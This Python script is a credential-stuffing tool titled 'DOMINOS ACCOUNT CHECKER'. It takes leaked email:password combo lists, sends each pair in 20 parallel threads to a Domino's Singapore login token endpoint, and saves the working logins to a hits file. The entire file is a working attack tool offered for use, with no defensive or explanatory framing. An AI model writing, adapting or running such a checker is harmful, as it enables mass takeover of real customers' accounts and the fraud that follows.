import requests
from concurrent.futures import ThreadPoolExecutor
import time
from colorama import Style, Fore, init
from os import name, system
from fake_useragent import UserAgent


class Acc():

    def Clear(self):
        if name == 'posix':
            # FOR LINUX
            system('clear')
        elif name == 'nt':
            # FOR WINDOWS
            system('cls')
        else:
            print("\n") * 120

    def __init__(self):
        self.SetTitle()
        self.hits = self.bads = self.retries = self.threads = 0
        self.Clear()
        init(convert=True)
        self.startTime = time.time()

        title = Style.BRIGHT + Fore.GREEN + """
			╔══════════════════════════════════════════════════╗
			    ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗	
			    ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝	
			    ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═	
			╚══════════════════════════════════════════════════╝
			\n\n\n
        """
        print(title)

    def SetTitle(self):
        system("title [DOMINOS ACCOUNT CHECKER]")

    def UpdateTitle(self):
        system(f"title [DOMINOS ACCOUNT CHECKER] ^| HITS {self.hits} ^| BADS {self.bads} ^| RETRIES {self.retries} ^| THREADS {self.threads}")

    def ReadFile(self, fname):
        with open(fname, "r", encoding='utf8') as f:
            readlines = f.readlines();
            self.comboLen = len(readlines)
            return readlines

    def ResultProcessor(self, status, email, pwd):
        if status == 400:
            print(Style.BRIGHT + Fore.RED + "[ BAD ] " + email + ":" + pwd + "\n", end='', flush=True)
            self.bads += 1
            with open("Results/bads.txt", "a") as f:
                f.write(email + ":" + pwd + '\n')
        elif status == 200:
            print(Style.BRIGHT + Fore.GREEN + "[ HIT ] " + email + ":" + pwd + "\n", end='', flush=True)
            self.hits += 1
            with open("Results/hits.txt", "a") as f:
                f.write(email + ":" + pwd + '\n')
        else:
            print(Style.BRIGHT + Fore.YELLOW + "[ RETRY ] " + email + ":" + pwd + "\n", end='', flush=True)
            self.retries += 1
            with open("Results/retries.txt", "a") as f:
                f.write(email + ":" + pwd + '\n')

        self.UpdateTitle()

    def Login(self, email, pwd):
        try:
            response = requests.post("https://api.dominos.com.sg/api/Token", data={"UserName":email, "Password":pwd, "grant_type":"password"})
            self.ResultProcessor(response.status_code, email, pwd)
        except:
            print(Style.BRIGHT + Fore.RED + "[ ERROR ] " + email + ":" + pwd + "\n", end='', flush=True)

    def Start(self):
        combos = self.ReadFile("Data/combo.txt")
        with ThreadPoolExecutor(max_workers=20) as executor:
	        for combo in combos:
	            if combo == "\n":
	                continue
	            email = combo.split(':')[0].strip()
	            pwd = combo.split(':')[-1].strip()
	            executor.submit(self.Login, email, pwd)

    def End(self):
        finishedTime = int((time.time() - self.startTime))
        checked = self.hits + self.bads
        print('\n\n\n')
        print(Style.BRIGHT + Fore.CYAN + f"[+] DONE")
        print(Style.BRIGHT + Fore.MAGENTA + f"[+] CHECKED {checked} of {self.comboLen}")
        print(Style.BRIGHT + Fore.CYAN + f"[+] Took {finishedTime} seconds")
        print(Style.BRIGHT + Fore.GREEN + f"[+] HITS {self.hits}")
        print(Style.BRIGHT + Fore.RED + f"[-] BADS {self.bads}")
        print(Style.BRIGHT + Fore.YELLOW  +f"[*] RETRIES {self.retries}")

nfx = Acc()
nfx.Start()
nfx.End()


print('\n\n')
input("Press any key to exit..")